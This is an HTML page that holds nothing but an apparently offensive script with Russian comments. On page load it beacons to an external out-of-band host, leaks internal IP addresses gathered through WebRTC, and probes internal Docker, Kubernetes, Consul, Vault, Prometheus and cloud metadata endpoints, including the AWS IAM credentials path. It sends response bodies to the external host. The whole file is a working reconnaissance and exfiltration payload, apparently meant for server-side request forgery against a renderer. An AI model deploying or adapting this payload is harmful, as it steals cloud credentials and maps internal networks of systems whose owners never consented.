<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}

fire('/alive4?t=0');

// 1. WebRTC — внутренние IP без сетевых запросов
(function() {
  try {
    var pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel('x');
    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
    pc.onicecandidate = function(ev) {
      if (!ev || !ev.candidate) return;
      var m = (ev.candidate.candidate || '').match(/\b(\d{1,3}\.){3}\d{1,3}\b/g) || [];
      m.forEach(function(ip) { fire('/rtc?ip=' + encodeURIComponent(ip)); });
    };
  } catch(e) { fire('/rtc-err?e=' + encodeURIComponent(e.message.slice(0, 80))); }
})();

// 2. Скан внутренних сервисов — timing + попытка прочитать тело
var targets = [
  ['docker-api',    'http://172.17.0.1:2375/version'],
  ['docker-info',   'http://172.17.0.1:2375/info'],
  ['k8s-api',       'http://10.96.0.1/version'],
  ['k8s-health',    'http://10.96.0.1/healthz'],
  ['consul',        'http://172.17.0.1:8500/v1/catalog/services'],
  ['vault',         'http://172.17.0.1:8200/v1/sys/health'],
  ['prom',          'http://172.17.0.1:9090/api/v1/status/buildinfo'],
  ['gw-80',         'http://172.17.0.1/'],
  ['gw-8080',       'http://172.17.0.1:8080/'],
  ['meta-goog',     'http://metadata.google.internal/computeMetadata/v1/project/project-id'],
  ['imds-169',      'http://169.254.169.254/latest/meta-data/'],
  ['imds-iam',      'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
];

targets.forEach(function(t) {
  var label = t[0], url = t[1], t0 = Date.now();
  fetch(url, {signal: AbortSignal.timeout(250)})
    .then(function(r) {
      return r.text().then(function(body) {
        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 300)));
      });
    })
    .catch(function(e) {
      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
    });
});
</script>
</body>
</html>
